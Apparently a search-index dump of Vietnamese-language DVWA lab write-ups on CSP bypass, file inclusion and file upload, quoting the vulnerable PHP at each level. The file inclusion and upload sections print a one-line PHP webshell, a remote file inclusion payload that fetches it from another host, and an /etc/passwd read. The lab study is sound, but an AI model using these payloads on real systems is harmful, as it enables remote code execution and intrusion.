https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;\" ; // allows js from self , pastebin . com , hastebin . com , jquery and google analytics . header ( $ headerCSP ); # These might work if you can't create your own for some reason # https://pastebin.com/raw/R570EE00 # https://www.toptal.com/developers/hastebin/raw/cezaruzeka ? > < ? php if ( isset ( $ _POST [ 'include' ])) { $ page [ 'body' ] .= \" < script src = '\" . $_POST[' include '] . \"' ></ script > \"; } $ page [ 'body' ] .= ' < form name = \"csp\" method = \"POST\" > < p > You can include scripts from external sources , examine the Content Security Policy and enter a URL to include here : </ p > < input size = \"50\" type = \"text\" name = \"include\" value = \"\" id = \"include\" /> < input type = \"submit\" value = \"Include\" /> </ form > '; Analysis \u00b6 Exploition \u00b6 Security Level: Medium \u00b6 Source code vulnerabilities/csp/source/medium.php < ? php $ headerCSP = \"Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';\" ; header ( $ headerCSP ); // Disable XSS protections so that inline alert boxes will work header ( \"X-XSS-Protection: 0\" ); # <script nonce=\"TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=\">alert(1)</script> ? > < ? php if ( isset ( $ _POST [ 'include' ])) { $ page [ 'body' ] .= \" \" . $_POST['include'] . \" \"; } $ page [ 'body' ] .= ' < form name = \"csp\" method = \"POST\" > < p > Whatever you enter here gets dropped directly into the page , see if you can get an alert box to pop up .</ p > < input size = \"50\" type = \"text\" name = \"include\" value = \"\" id = \"include\" /> < input type = \"submit\" value = \"Include\" /> </ form > '; Analysis \u00b6 Exploition \u00b6 Security Level: High \u00b6 Source code vulnerabilities/csp/source/high.php < ? php $ headerCSP = \"Content-Security-Policy: script-src 'self';\" ; header ( $ headerCSP ); ? > < ? php if ( isset ( $ _POST [ 'include' ])) { $ page [ 'body' ] .= \" \" . $_POST['include'] . \" \"; } $ page [ 'body' ] .= ' < form name = \"csp\" method = \"POST\" > < p > The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . ' / vulnerabilities / csp / source / jsonp . php to load some code . Modify that page to run your own code .</ p > < p > 1 + 2 + 3 + 4 + 5 =< span id = \"answer\" ></ span ></ p > < input type = \"button\" id = \"solve\" value = \"Solve the sum\" /> </ form > < script src = \"source/high.js\" ></ script > '; Analysis \u00b6 Exploition \u00b6 Security Level: Impossible \u00b6 Source code vulnerabilities/csp/source/impossible.php < ? php $ headerCSP = \"Content-Security-Policy: script-src 'self';\" ; header ( $ headerCSP ); ? > < ? php if ( isset ( $ _POST [ 'include' ])) { $ page [ 'body' ] .= \" \" . $_POST['include'] . \" \"; } $ page [ 'body' ] .= ' < form name = \"csp\" method = \"POST\" > < p > Unlike the high level , this does a JSONP call but does not use a callback , instead it hardcodes the function to call .</ p >< p > The CSP settings only allow external JavaScript on the local server and no inline code .</ p > < p > 1 + 2 + 3 + 4 + 5 =< span id = \"answer\" ></ span ></ p > < input type = \"button\" id = \"solve\" value = \"Solve the sum\" /> </ form > < script src = \"source/impossible.js\" ></ script > '; Analysis \u00b6 What we learned \u00b6 More Information \u00b6 Content Security Policy Reference Mozilla Developer Network - CSP: script-src Mozilla Security Blog - CSP for the web we have","title":"CSP Bypass"},{"location":"dvwa/csp-bypass/#csp-bypass","text":"","title":"CSP Bypass"},{"location":"dvwa/csp-bypass/#about","text":"Content Security Policy (CSP) is used to define where scripts and other resources can be loaded or executed from. This module will walk you through ways to bypass the policy based on common mistakes made by developers. None of the vulnerabilities are actual vulnerabilities in CSP, they are vulnerabilities in the way it has been implemented.","title":"About"},{"location":"dvwa/csp-bypass/#objective","text":"Bypass Content Security Policy (CSP) and execute JavaScript in the page.","title":"Objective"},{"location":"dvwa/csp-bypass/#security-level-low","text":"Source code vulnerabilities/csp/source/low.php < ? php $ headerCSP = \"Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;\" ; // allows js from self , pastebin . com , hastebin . com , jquery and google analytics . header ( $ headerCSP ); # These might work if you can't create your own for some reason # https://pastebin.com/raw/R570EE00 # https://www.toptal.com/developers/hastebin/raw/cezaruzeka ? > < ? php if ( isset ( $ _POST [ 'include' ])) { $ page [ 'body' ] .= \" < script src = '\" . $_POST[' include '] . \"' ></ script > \"; } $ page [ 'body' ] .= ' < form name = \"csp\" method = \"POST\" > < p > You can include scripts from external sources , examine the Content Security Policy and enter a URL to include here : </ p > < input size = \"50\" type = \"text\" name = \"include\" value = \"\" id = \"include\" /> < input type = \"submit\" value = \"Include\" /> </ form > ';","title":"Security Level: Low"},{"location":"dvwa/csp-bypass/#analysis","text":"","title":"Analysis"},{"location":"dvwa/csp-bypass/#exploition","text":"","title":"Exploition"},{"location":"dvwa/csp-bypass/#security-level-medium","text":"Source code vulnerabilities/csp/source/medium.php < ? php $ headerCSP = \"Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';\" ; header ( $ headerCSP ); // Disable XSS protections so that inline alert boxes will work header ( \"X-XSS-Protection: 0\" ); # <script nonce=\"TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=\">alert(1)</script> ? > < ? php if ( isset ( $ _POST [ 'include' ])) { $ page [ 'body' ] .= \" \" . $_POST['include'] . \" \"; } $ page [ 'body' ] .= ' < form name = \"csp\" method = \"POST\" > < p > Whatever you enter here gets dropped directly into the page , see if you can get an alert box to pop up .</ p > < input size = \"50\" type = \"text\" name = \"include\" value = \"\" id = \"include\" /> < input type = \"submit\" value = \"Include\" /> </ form > ';","title":"Security Level: Medium"},{"location":"dvwa/csp-bypass/#analysis_1","text":"","title":"Analysis"},{"location":"dvwa/csp-bypass/#exploition_1","text":"","title":"Exploition"},{"location":"dvwa/csp-bypass/#security-level-high","text":"Source code vulnerabilities/csp/source/high.php < ? php $ headerCSP = \"Content-Security-Policy: script-src 'self';\" ; header ( $ headerCSP ); ? > < ? php if ( isset ( $ _POST [ 'include' ])) { $ page [ 'body' ] .= \" \" . $_POST['include'] . \" \"; } $ page [ 'body' ] .= ' < form name = \"csp\" method = \"POST\" > < p > The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . ' / vulnerabilities / csp / source / jsonp . php to load some code . Modify that page to run your own code .</ p > < p > 1 + 2 + 3 + 4 + 5 =< span id = \"answer\" ></ span ></ p > < input type = \"button\" id = \"solve\" value = \"Solve the sum\" /> </ form > < script src = \"source/high.js\" ></ script > ';","title":"Security Level: High"},{"location":"dvwa/csp-bypass/#analysis_2","text":"","title":"Analysis"},{"location":"dvwa/csp-bypass/#exploition_2","text":"","title":"Exploition"},{"location":"dvwa/csp-bypass/#security-level-impossible","text":"Source code vulnerabilities/csp/source/impossible.php < ? php $ headerCSP = \"Content-Security-Policy: script-src 'self';\" ; header ( $ headerCSP ); ? > < ? php if ( isset ( $ _POST [ 'include' ])) { $ page [ 'body' ] .= \" \" . $_POST['include'] . \" \"; } $ page [ 'body' ] .= ' < form name = \"csp\" method = \"POST\" > < p > Unlike the high level , this does a JSONP call but does not use a callback , instead it hardcodes the function to call .</ p >< p > The CSP settings only allow external JavaScript on the local server and no inline code .</ p > < p > 1 + 2 + 3 + 4 + 5 =< span id = \"answer\" ></ span ></ p > < input type = \"button\" id = \"solve\" value = \"Solve the sum\" /> </ form > < script src = \"source/impossible.js\" ></ script > ';","title":"Security Level: Impossible"},{"location":"dvwa/csp-bypass/#analysis_3","text":"","title":"Analysis"},{"location":"dvwa/csp-bypass/#what-we-learned","text":"","title":"What we learned"},{"location":"dvwa/csp-bypass/#more-information","text":"Content Security Policy Reference Mozilla Developer Network - CSP: script-src Mozilla Security Blog - CSP for the web we have","title":"More Information"},{"location":"dvwa/file-inclusion/","tags":["DVWA"],"text":"File Inclusion \u00b6 A file inclusion vulnerability is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time. This issue is caused when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time. A file include vulnerability is distinct from a generic directory traversal attack, in that directory traversal is a way of gaining unauthorized file system access, and a file inclusion vulnerability subverts how an application loads code for execution. Successful exploitation of a file inclusion vulnerability will result in remote code execution on the web server that runs the affected web application. An attacker can use remote code execution to create a web shell on the web server, which can be used for website defacement. Host : 192.168.37.162 Domain DVWWA : http://192.168.37.162:4280 Website provided for RFI : http://192.168.37.162:4280/hackable/flags/fi.php Security Level: Low \u00b6 Source code vulnerabilities/fi/source/low.php <?php // The page we wish to display $file = $_GET [ 'page' ]; ?> Analysis \u00b6 \u1ede c\u1ea5p \u0111\u1ed9 n\u00e0y th\u00ec kh\u00e1 \u0111\u01a1n gi\u1ea3n, ta th\u1ea5y r\u1eb1ng url nh\u1eadn tham s\u1ed1 page \u0111\u1ec3 hi\u1ec3n th\u1ecb c\u00e1c file1.php, file2.php, file3.php nh\u01b0 h\u00ecnh b\u00ean d\u01b0\u1edbi H\u01a1n n\u1eefa, source code ho\u00e0n to\u00e0n kh\u00f4ng c\u00f3 filter n\u00ean vi\u1ec7c ta \"th\u0103m d\u00f2\" file \u1ea9n trong h\u1ec7 th\u1ed1ng th\u1ef1c s\u1ef1 d\u1ec5 d\u00e0ng Oke, c\u00f3 nh\u1eefng ti\u1ec1n \u0111\u1ec1 \u0111\u1ec3 ta ti\u1ebfn h\u00e0nh khai th\u00e1c r\u1ed3i Exploition \u00b6 LFI \u00b6 Khi n\u00f3i \u0111\u1ebfn local file inclusion l\u00e0 n\u00f3i \u0111\u1ebfn vi\u1ec7c truy xu\u1ea5t file h\u1ec7 th\u1ed1ng th\u00f4ng qua c\u00e1c \u0111\u1ed1i s\u1ed1 \u0111\u01b0\u1ee3c truy\u1ec1n v\u00e0o. \u0110\u01a1n gi\u1ea3n nh\u1ea5t th\u01b0\u1eddng th\u1ea5y l\u00e0 l\u1ea5y ra file /etc/passwd RFI \u00b6 Ta s\u1ebd t\u1ea1o m\u1ed9t webshell \u0111\u01a1n gi\u1ea3n v\u00e0 deploy local t\u1ea1i url http://192.168.37.162:8000/ws_ter_get.php ws_ter_get <? = `$_GET[0]` ?> R\u1ed3i truy\u1ec1n \u0111\u1ed1i s\u1ed1 v\u00e0o v\u00e0 truy xu\u1ea5t th\u00f4ng tin h\u1ec7 th\u1ed1ng th\u00f4i Security Level: Medium \u00b6 Source code vulnerabilities/fi/source/medium.php <?php // The page we wish to display $file = $_GET [ 'page' ]; // Input validation $file = str_replace ( array ( \"http://\" , \"https://\" ), \"\" , $file ); $file = str_replace ( array ( \"../\" , \".. \\\\ \" ), \"\" , $file ); ?> Analysis \u00b6 \u1ede m\u1ee9c \u0111\u1ed9 n\u00e0y th\u00ec h\u1ecd \u0111\u00e3 c\u00f3 filter \u0111\u1ea7u v\u00e0o cho c\u1ea3 RFI v\u00e0 LFI nh\u01b0ng filter n\u00e0y c\u00f2n h\u01a1n non :3 \u1ede b\u00e0i vi\u1ebft Command Injection t\u00f4i c\u0169ng \u0111\u00e3 gi\u1ea3i th\u00edch s\u01a1 b\u1ed9 chuy\u1ec7n filter n\u00e0y. V\u1ec1 c\u01a1 b\u1ea3n, h\u00e0nh vi filter c\u1ee7a c\u00e1c h\u00e0m nh\u01b0 str_replace,... kh\u00f4ng c\u00f3 \"\u0111\u1ec7 quy\" t\u1ee9c n\u1ebfu n\u00f3 filter ../ trong chu\u1ed7i ....// th\u00ec n\u00f3 s\u1ebd l\u1ea5y ../ \u1edf ch\u00ednh gi\u1eefa, c\u00f2n l\u1ea1i v\u1eabn l\u00e0 ../ nh\u01b0ng l\u00fac n\u00e0y n\u00f3 kh\u00f4ng ti\u1ebfp t\u1ee5c thao t\u00e1c (kh\u00f4ng \u0111\u1ec7 quy). Gi\u1ea3i th\u00edch t\u01b0\u01a1ng t\u1ef1 v\u1edbi vi\u1ec7c filter http:// v\u00e0 https:// Exploition \u00b6 RFI \u00b6 :3 Ti\u00eam payload th\u00f4i ht http:// tp://192.168.37.162:8000/ws_ter_get.php&0=ls Security Level: High \u00b6 Source code vulnerabilities/fi/source/high.php <?php // The page we wish to display $file = $_GET [ 'page' ]; // Input validation if ( ! fnmatch ( \"file*\" , $file ) && $file != \"include.php\" ) { // This isn't the page we want! echo \"ERROR: File not found!\" ; exit ; } ?> Analysis \u00b6 \u1ede challenge n\u00e0y, h\u1ecd filter \u1edf m\u1ee9c \u0111\u1ed9 cao h\u01a1n. Ch\u00fa \u00fd logic d\u00f2ng if. !fnmatch( \"file*\", $file ) && $file != \"include.php\" \u0110o\u1ea1n tr\u00ean th\u1ec3 hi\u1ec7n vi\u1ec7c n\u1ebfu m\u00e0 file truy\u1ec1n v\u00e0o c\u00f3 t\u00ean kh\u00f4ng b\u1eaft \u0111\u1ea7u b\u1eb1ng file v\u00e0 n\u00f3 kh\u00e1c file include.php th\u00ec l\u1eadp t\u1ee9c b\u00e1o l\u1ed7i. M\u1ed9t g\u00f3c nh\u00ecn r\u1ed9ng h\u01a1n: Ta c\u00f3 th\u1ec3 xem \u0111o\u1ea1n logic n\u00e0y nh\u01b0 1 lo\u1ea1i whitelist c\u01a1 b\u1ea3n Exploition \u00b6 Ta s\u1ebd link t\u1edbi challenge File Upload \u0111\u1ec3 gi\u1ea3i quy\u1ebft l\u1ed7 h\u1ed5ng n\u00e0y Security Level: Impossible \u00b6 Source code vulnerabilities/fi/source/impossible.php <?php // The page we wish to display $file = $_GET [ 'page' ]; // Only allow include.php or file{1..3}.php if ( $file != \"include.php\" && $file != \"file1.php\" && $file != \"file2.php\" && $file != \"file3.php\" ) { // This isn't the page we want! echo \"ERROR: File not found!\" ; exit ; } ?> Analysis \u00b6 \u1ede m\u1ee9c \u0111\u1ed9 n\u00e0y, h\u1ecd set 1 whitelist g\u1ed3m 4 file {include.php, file1.php, file2.php, file3.php} v\u00e0 hi\u1ec3n nhi\u00ean ta s\u1ebd kh\u00f3 \u0111\u1ec3 khai th\u00e1c l\u1ed7 h\u1ed5ng ngay l\u00fac n\u00e0y. What we learned \u00b6 LFI RFI More Information \u00b6 Wikipedia - File inclusion vulnerability WSTG - Local File Inclusion WSTG - Remote File Inclusion","title":"File Inclusion"},{"location":"dvwa/file-inclusion/#file-inclusion","text":"A file inclusion vulnerability is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time. This issue is caused when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time. A file include vulnerability is distinct from a generic directory traversal attack, in that directory traversal is a way of gaining unauthorized file system access, and a file inclusion vulnerability subverts how an application loads code for execution. Successful exploitation of a file inclusion vulnerability will result in remote code execution on the web server that runs the affected web application. An attacker can use remote code execution to create a web shell on the web server, which can be used for website defacement. Host : 192.168.37.162 Domain DVWWA : http://192.168.37.162:4280 Website provided for RFI : http://192.168.37.162:4280/hackable/flags/fi.php","title":"File Inclusion"},{"location":"dvwa/file-inclusion/#security-level-low","text":"Source code vulnerabilities/fi/source/low.php <?php // The page we wish to display $file = $_GET [ 'page' ]; ?>","title":"Security Level: Low"},{"location":"dvwa/file-inclusion/#analysis","text":"\u1ede c\u1ea5p \u0111\u1ed9 n\u00e0y th\u00ec kh\u00e1 \u0111\u01a1n gi\u1ea3n, ta th\u1ea5y r\u1eb1ng url nh\u1eadn tham s\u1ed1 page \u0111\u1ec3 hi\u1ec3n th\u1ecb c\u00e1c file1.php, file2.php, file3.php nh\u01b0 h\u00ecnh b\u00ean d\u01b0\u1edbi H\u01a1n n\u1eefa, source code ho\u00e0n to\u00e0n kh\u00f4ng c\u00f3 filter n\u00ean vi\u1ec7c ta \"th\u0103m d\u00f2\" file \u1ea9n trong h\u1ec7 th\u1ed1ng th\u1ef1c s\u1ef1 d\u1ec5 d\u00e0ng Oke, c\u00f3 nh\u1eefng ti\u1ec1n \u0111\u1ec1 \u0111\u1ec3 ta ti\u1ebfn h\u00e0nh khai th\u00e1c r\u1ed3i","title":"Analysis"},{"location":"dvwa/file-inclusion/#exploition","text":"","title":"Exploition"},{"location":"dvwa/file-inclusion/#lfi","text":"Khi n\u00f3i \u0111\u1ebfn local file inclusion l\u00e0 n\u00f3i \u0111\u1ebfn vi\u1ec7c truy xu\u1ea5t file h\u1ec7 th\u1ed1ng th\u00f4ng qua c\u00e1c \u0111\u1ed1i s\u1ed1 \u0111\u01b0\u1ee3c truy\u1ec1n v\u00e0o. \u0110\u01a1n gi\u1ea3n nh\u1ea5t th\u01b0\u1eddng th\u1ea5y l\u00e0 l\u1ea5y ra file /etc/passwd","title":"LFI"},{"location":"dvwa/file-inclusion/#rfi","text":"Ta s\u1ebd t\u1ea1o m\u1ed9t webshell \u0111\u01a1n gi\u1ea3n v\u00e0 deploy local t\u1ea1i url http://192.168.37.162:8000/ws_ter_get.php ws_ter_get <? = `$_GET[0]` ?> R\u1ed3i truy\u1ec1n \u0111\u1ed1i s\u1ed1 v\u00e0o v\u00e0 truy xu\u1ea5t th\u00f4ng tin h\u1ec7 th\u1ed1ng th\u00f4i","title":"RFI"},{"location":"dvwa/file-inclusion/#security-level-medium","text":"Source code vulnerabilities/fi/source/medium.php <?php // The page we wish to display $file = $_GET [ 'page' ]; // Input validation $file = str_replace ( array ( \"http://\" , \"https://\" ), \"\" , $file ); $file = str_replace ( array ( \"../\" , \".. \\\\ \" ), \"\" , $file ); ?>","title":"Security Level: Medium"},{"location":"dvwa/file-inclusion/#analysis_1","text":"\u1ede m\u1ee9c \u0111\u1ed9 n\u00e0y th\u00ec h\u1ecd \u0111\u00e3 c\u00f3 filter \u0111\u1ea7u v\u00e0o cho c\u1ea3 RFI v\u00e0 LFI nh\u01b0ng filter n\u00e0y c\u00f2n h\u01a1n non :3 \u1ede b\u00e0i vi\u1ebft Command Injection t\u00f4i c\u0169ng \u0111\u00e3 gi\u1ea3i th\u00edch s\u01a1 b\u1ed9 chuy\u1ec7n filter n\u00e0y. V\u1ec1 c\u01a1 b\u1ea3n, h\u00e0nh vi filter c\u1ee7a c\u00e1c h\u00e0m nh\u01b0 str_replace,... kh\u00f4ng c\u00f3 \"\u0111\u1ec7 quy\" t\u1ee9c n\u1ebfu n\u00f3 filter ../ trong chu\u1ed7i ....// th\u00ec n\u00f3 s\u1ebd l\u1ea5y ../ \u1edf ch\u00ednh gi\u1eefa, c\u00f2n l\u1ea1i v\u1eabn l\u00e0 ../ nh\u01b0ng l\u00fac n\u00e0y n\u00f3 kh\u00f4ng ti\u1ebfp t\u1ee5c thao t\u00e1c (kh\u00f4ng \u0111\u1ec7 quy). Gi\u1ea3i th\u00edch t\u01b0\u01a1ng t\u1ef1 v\u1edbi vi\u1ec7c filter http:// v\u00e0 https://","title":"Analysis"},{"location":"dvwa/file-inclusion/#exploition_1","text":"","title":"Exploition"},{"location":"dvwa/file-inclusion/#rfi_1","text":":3 Ti\u00eam payload th\u00f4i ht http:// tp://192.168.37.162:8000/ws_ter_get.php&0=ls","title":"RFI"},{"location":"dvwa/file-inclusion/#security-level-high","text":"Source code vulnerabilities/fi/source/high.php <?php // The page we wish to display $file = $_GET [ 'page' ]; // Input validation if ( ! fnmatch ( \"file*\" , $file ) && $file != \"include.php\" ) { // This isn't the page we want! echo \"ERROR: File not found!\" ; exit ; } ?>","title":"Security Level: High"},{"location":"dvwa/file-inclusion/#analysis_2","text":"\u1ede challenge n\u00e0y, h\u1ecd filter \u1edf m\u1ee9c \u0111\u1ed9 cao h\u01a1n. Ch\u00fa \u00fd logic d\u00f2ng if. !fnmatch( \"file*\", $file ) && $file != \"include.php\" \u0110o\u1ea1n tr\u00ean th\u1ec3 hi\u1ec7n vi\u1ec7c n\u1ebfu m\u00e0 file truy\u1ec1n v\u00e0o c\u00f3 t\u00ean kh\u00f4ng b\u1eaft \u0111\u1ea7u b\u1eb1ng file v\u00e0 n\u00f3 kh\u00e1c file include.php th\u00ec l\u1eadp t\u1ee9c b\u00e1o l\u1ed7i. M\u1ed9t g\u00f3c nh\u00ecn r\u1ed9ng h\u01a1n: Ta c\u00f3 th\u1ec3 xem \u0111o\u1ea1n logic n\u00e0y nh\u01b0 1 lo\u1ea1i whitelist c\u01a1 b\u1ea3n","title":"Analysis"},{"location":"dvwa/file-inclusion/#exploition_2","text":"Ta s\u1ebd link t\u1edbi challenge File Upload \u0111\u1ec3 gi\u1ea3i quy\u1ebft l\u1ed7 h\u1ed5ng n\u00e0y","title":"Exploition"},{"location":"dvwa/file-inclusion/#security-level-impossible","text":"Source code vulnerabilities/fi/source/impossible.php <?php // The page we wish to display $file = $_GET [ 'page' ]; // Only allow include.php or file{1..3}.php if ( $file != \"include.php\" && $file != \"file1.php\" && $file != \"file2.php\" && $file != \"file3.php\" ) { // This isn't the page we want! echo \"ERROR: File not found!\" ; exit ; } ?>","title":"Security Level: Impossible"},{"location":"dvwa/file-inclusion/#analysis_3","text":"\u1ede m\u1ee9c \u0111\u1ed9 n\u00e0y, h\u1ecd set 1 whitelist g\u1ed3m 4 file {include.php, file1.php, file2.php, file3.php} v\u00e0 hi\u1ec3n nhi\u00ean ta s\u1ebd kh\u00f3 \u0111\u1ec3 khai th\u00e1c l\u1ed7 h\u1ed5ng ngay l\u00fac n\u00e0y.","title":"Analysis"},{"location":"dvwa/file-inclusion/#what-we-learned","text":"LFI RFI","title":"What we learned"},{"location":"dvwa/file-inclusion/#more-information","text":"Wikipedia - File inclusion vulnerability WSTG - Local File Inclusion WSTG - Remote File Inclusion","title":"More Information"},{"location":"dvwa/file-upload/","tags":["DVWA"],"text":"File Upload \u00b6 Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the first step. The consequences of unrestricted file upload can vary, including complete system takeover, an overloaded file system or database, forwarding attacks to back-end systems, client-side attacks, or simple defacement. It depends on what the application does with the uploaded file and especially where it is stored. There are really two classes of problems here. The first is with the file metadata, like the path and file name. These are generally provided by the transport, such as HTTP multi-part encoding. This data may trick the application into overwriting a critical file or storing the file in a bad location. You must validate the metadata extremely carefully before using it. The other class of problem is with the file size or content. The range of problems here depends entirely on what the file is used for. See the examples below for some ideas about how files might be misused. To protect against this type of attack, you should analyse everything your application does with files and think carefully about what processing and interpreters are involved. Security Level: Low \u00b6 Source code vulnerabilities/upload/source/low.php <?php if ( isset ( $_POST [ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\" ; $target_path .= basename ( $_FILES [ 'uploaded' ][ 'name' ] ); // Can we move the file to the upload folder? if ( ! move_uploaded_file ( $_FILES [ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // No echo '<pre>Your image was not uploaded.</pre>' ; } else { // Yes! echo \"<pre> { $target_path } succesfully uploaded!</pre>\" ; } } ?> Analysis \u00b6 Challenge n\u00e0y \u0111\u01a1n gi\u1ea3n th\u00f4i, h\u1ecd cung c\u1ea5p cho ta m\u1ed9t trang upload file (upload l\u00ean /hackable/uploads) t\u00f9y \u00fd, ta s\u1ebd t\u1eadn d\u1ee5ng n\u00f3 \u0111\u1ec3 upload file webshell Exploition \u00b6 Upload th\u00e0nh c\u00f4ng \u0110\u1ec3 ta ki\u1ec3m ch\u1ee9ng file upload c\u00f3 ho\u1ea1t \u0111\u1ed9ng hay kh\u00f4ng ta c\u00f3 th\u1ec3 truy c\u1eadp th\u1eb3ng website http://192.168.37.162:4280/hackable/uploads/ws_ter_get.php?0=ls Ho\u1eb7c ta c\u00f3 th\u1ec3 t\u1eadn d\u1ee5ng challenge File Inclusion \u0111\u1ec3 ki\u1ec3m ch\u1ee9ng. Security Level: Medium \u00b6 Source code vulnerabilities/upload/source/medium.php <?php if ( isset ( $_POST [ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\" ; $target_path .= basename ( $_FILES [ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES [ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES [ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES [ 'uploaded' ][ 'size' ]; // Is it an image? if ( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) && ( $uploaded_size < 100000 ) ) { // Can we move the file to the upload folder? if ( ! move_uploaded_file ( $_FILES [ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // No echo '<pre>Your image was not uploaded.</pre>' ; } else { // Yes! echo \"<pre> { $target_path } succesfully uploaded!</pre>\" ; } } else { // Invalid file echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>' ; } } ?> Analysis \u00b6 \u1ede challenge n\u00e0y, h\u1ecd gi\u1edbi h\u1ea1n l\u1ea1i lo\u1ea1i file \u0111\u01b0\u1ee3c upload l\u00ean ch\u1ec9 l\u00e0 file \u1ea3nh (c\u1ee5 th\u1ec3 l\u00e0 JPEG ho\u1eb7c PNG). Nh\u01b0ng nh\u00ecn k\u0129 \u0111i, h\u1ecd check lo\u1ea1i file vi\u1ec7c l\u1ea5y \u0111\u1ecbnh d\u1ea1ng MIME file (gi\u00e1 tr\u1ecb \u0111\u01b0\u1ee3c t\u1ea3i l\u00ean trong tr\u01b0\u1eddng Content-Type ). Ta s\u1ebd fake gi\u00e1 tr\u1ecb MIME b\u1eb1ng vi\u1ec7c \u0111\u1ed5i extension file Exploition \u00b6 Nh\u01b0 \u0111\u00e3 ph\u00e2n t\u00edch \u1edf tr\u00ean, V\u00e0 file \u0111\u00e3 upload th\u00e0nh c\u00f4ng tr\u00ean h\u1ec7 th\u1ed1ng H\u00ecnh \u1ea3nh ki\u1ebfm ch\u1ee9ng vi\u1ec7c th\u1ef1c thi file Security Level: High \u00b6 Source code vulnerabilities/upload/source/high.php <?php if ( isset ( $_POST [ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\" ; $target_path .= basename ( $_FILES [ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES [ 'uploaded' ][ 'name' ]; $uploaded_ext = substr ( $uploaded_name , strrpos ( $uploaded_name , '.' ) + 1 ); $uploaded_size = $_FILES [ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES [ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if ( ( strtolower ( $uploaded_ext ) == \"jpg\" || strtolower ( $uploaded_ext ) == \"jpeg\" || strtolower ( $uploaded_ext ) == \"png\" ) && ( $uploaded_size < 100000 ) && getimagesize ( $uploaded_tmp ) ) { // Can we move the file to the upload folder? if ( ! move_uploaded_file ( $uploaded_tmp , $target_path ) ) { // No echo '<pre>Your image was not uploaded.</pre>' ; } else { // Yes! echo \"<pre> { $target_path } succesfully uploaded!</pre>\" ; } } else { // Invalid file echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>' ; } } ?> Analysis \u00b6 \u1ede challenge n\u00e0y, h\u1ecd \u0111\u00e3 t\u00e1ch extension ra ri\u00eang v\u00e0 so s\u00e1nh. C\u1ee5 th\u1ec3 substr($uploaded_name, strrpos($uploaded_name, '.') + 1) : H\u00e0m substr \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 tr\u00edch xu\u1ea5t m\u1ed9t ph\u1ea7n c\u1ee7a chu\u1ed7i t\u1eeb v\u1ecb tr\u00ed \u0111\u00e3 x\u00e1c \u0111\u1ecbnh b\u1edfi strrpos($uploaded_name, '.') + 1 \u0111\u1ebfn cu\u1ed1i chu\u1ed7i. Trong tr\u01b0\u1eddng h\u1ee3p n\u00e0y, n\u00f3 tr\u00edch xu\u1ea5t ph\u1ea7n m\u1edf r\u1ed9ng c\u1ee7a t\u00ean t\u1ec7p. V\u00ed d\u1ee5, n\u1ebfu $uploaded_name l\u00e0 \"abc.png\", th\u00ec bi\u1ebfn $uploaded_ext s\u1ebd ch\u1ee9a \"png\". Exploition \u00b6 Ta s\u1ebd d\u00f9ng magic number \u0111\u1ec3 bypass challenge n\u00e0y. V\u00e0 ta \u0111\u00e3 th\u00e0nh c\u00f4ng upload file webshell Check l\u1ea1i xem nh\u00e9 Magic number Security Level: Impossible \u00b6 Source code vulnerabilities/upload/source/impossible.php <?php if ( isset ( $_POST [ 'Upload' ] ) ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // File information $uploaded_name = $_FILES [ 'uploaded' ][ 'name' ]; $uploaded_ext = substr ( $uploaded_name , strrpos ( $uploaded_name , '.' ) + 1 ); $uploaded_size = $_FILES [ 'uploaded' ][ 'size' ]; $uploaded_type = $_FILES [ 'uploaded' ][ 'type' ]; $uploaded_tmp = $_FILES [ 'uploaded' ][ 'tmp_name' ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/' ; //$target_file = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; $target_file = md5 ( uniqid () . $uploaded_name ) . '.' . $uploaded_ext ; $temp_file = ( ( ini_get ( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir () ) : ( ini_get ( 'upload_tmp_dir' ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5 ( uniqid () . $uploaded_name ) . '.' . $uploaded_ext ; // Is it an image? if ( ( strtolower ( $uploaded_ext ) == 'jpg' || strtolower ( $uploaded_ext ) == 'jpeg' || strtolower ( $uploaded_ext ) == 'png' ) && ( $uploaded_size < 100000 ) && ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) && getimagesize ( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if ( $uploaded_type == 